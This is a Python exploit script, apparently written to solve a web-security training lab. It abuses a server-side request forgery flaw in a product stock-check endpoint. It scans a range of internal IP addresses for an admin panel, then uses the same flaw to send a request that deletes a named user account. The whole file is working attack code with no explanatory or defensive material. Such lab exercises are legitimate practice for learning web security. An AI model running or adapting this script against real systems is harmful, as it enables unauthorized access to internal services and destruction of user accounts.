#!/usr/bin/python3

import requests
import sys

def ssrf(url, api, backend_IP, backend_PORT):

    # /product/stock API doesn't allow GET
    # POST - "Missing parameter 'stockApi'"
    
    for i in range(110,256): 

        data = {
            #"stockApi" : "http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1",
            "stockApi" : f"http://{backend_IP}{i}:{backend_PORT}/admin",
        }

        r = requests.post(url + api, data = data)

        print(f"[INFO] Traying: http://{backend_IP}{i}:{backend_PORT}/admin")

        if r.status_code == 200:
            print(f"[INFO] SSRF to admin page access granted: {backend_IP}{i}:{backend_PORT}")
            print(r.text)
            break
        else:
            pass
            #print("[ERROR] Something went wrong!")
            #sys.exit(1)

    return i

def deleteUser(url, api, backend_IP, backend_PORT, admin_range):

    username = "wiener"

    data = {
        "stockApi" : f"http://{backend_IP}{admin_range}:{backend_PORT}/admin/delete?username={username}"
    }

    r = requests.post(url + api, data = data)
    
    if r.status_code == 401:
        print(f"[INFO] Successfully deleted the user: {username}")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://ac931fcb1e9839eec06f62c000f700dd.web-security-academy.net"
    api = "/product/stock"
    backend_IP = "192.168.0."
    backend_PORT = "8080"

    admin_range = ssrf(url, api, backend_IP, backend_PORT)
    deleteUser(url, api, backend_IP, backend_PORT, admin_range)